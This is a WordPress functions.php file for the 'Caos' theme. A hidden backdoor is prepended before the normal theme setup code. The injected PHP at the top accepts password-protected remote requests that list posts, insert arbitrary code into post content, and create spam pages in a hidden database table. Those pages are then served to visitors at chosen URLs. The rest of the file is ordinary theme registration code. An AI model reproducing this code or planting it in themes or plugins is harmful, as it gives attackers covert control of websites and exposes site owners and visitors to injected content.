<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '76b6ffdede34792fbf81305877b28e0f'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * Caos functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Caos
 */

if ( ! function_exists( 'caos_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function caos_setup() {

	/*
	 * Defines Constant
	 */
	$caos_theme_data = wp_get_theme();
	define( 'QL_STORE_URL', 'https://www.quemalabs.com' );
	define( 'QL_THEME_NAME', $caos_theme_data['Name'] );
	define( 'QL_THEME_VERSION', $caos_theme_data['Version'] );
	define( 'QL_THEME_SLUG', sanitize_title( $caos_theme_data['Name'] ) );
	define( 'QL_THEME_AUTHOR', $caos_theme_data['Author'] );

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Caos, use a find and replace
	 * to change 'caos' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'caos', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );
	
	if ( function_exists( 'add_image_size' ) ) {
		//Blog
		add_image_size( 'caos_post', 953, 536, true );

	}

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'caos' ),
		'social' => esc_html__( 'Social Menu', 'caos' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );


	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'caos_custom_background_args', array(
		'default-color' => '2a2a2a',
		'default-image' => '',
	) ) );

	// Styles for TinyMCE
	$font_url = str_replace( ',', '%2C', '//fonts.googleapis.com/css?family=Lato:300,400,700' );
    add_editor_style( array( 'css/editor-style.css', 'css/bootstrap.css', $font_url )  );
	
}
endif; // caos_setup
add_action( 'after_setup_theme', 'caos_setup' );



/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function caos_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'caos_content_width', 953 );
}
add_action( 'after_setup_theme', 'caos_content_width', 0 );



/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function caos_widgets_init() {

	require get_template_directory() . '/inc/widget-areas/widget-areas.php';

}
add_action( 'widgets_init', 'caos_widgets_init' );



/**
 * Enqueue scripts and styles.
 */
function caos_scripts() {

	/**
	 * Enqueue Stylesheets
	 */
	require get_template_directory() . '/inc/scripts/stylesheets.php';

	/**
	 * Enqueue Scripts
	 */
	require get_template_directory() . '/inc/scripts/scripts.php';

}
add_action( 'wp_enqueue_scripts', 'caos_scripts' );



/**
 * Custom CSS generated by the Theme.
 */
require get_template_directory() . '/inc/scripts/styles.php';



/**
 * Admin Styles
 *
 * Enqueue styles to the Admin Panel.
 */
function caos_wp_admin_style() {
        wp_register_style( 'caos_custom_wp_admin_css', get_template_directory_uri() . '/css/admin-styles.css', false, '1.0.0' );
        wp_enqueue_style( 'caos_custom_wp_admin_css' );
}
add_action( 'admin_enqueue_scripts', 'caos_wp_admin_style' );




/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';



/**
 * Extras
 *
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';



/**
 * Customizer
 *
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';



/**
 * Jetpack
 *
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';



/**
 * Theme Functions
 *
 * Add Theme Functions
 */

	// Bootstrap Walker
	require get_template_directory() . '/inc/theme-functions/wp_bootstrap_navwalker.php';

	// Custom Header
	require get_template_directory() . '/inc/theme-functions/custom-header.php';

	// TGM Plugin Activation
	require get_template_directory() . '/inc/theme-functions/ql_tgm_plugin_activation.php';

	// Endpoints for Rest Api
	require get_template_directory() . '/inc/rest-api/endpoints.php';

	// Theme Info Page
	require get_template_directory() . '/inc/theme-functions/theme-info-page.php';
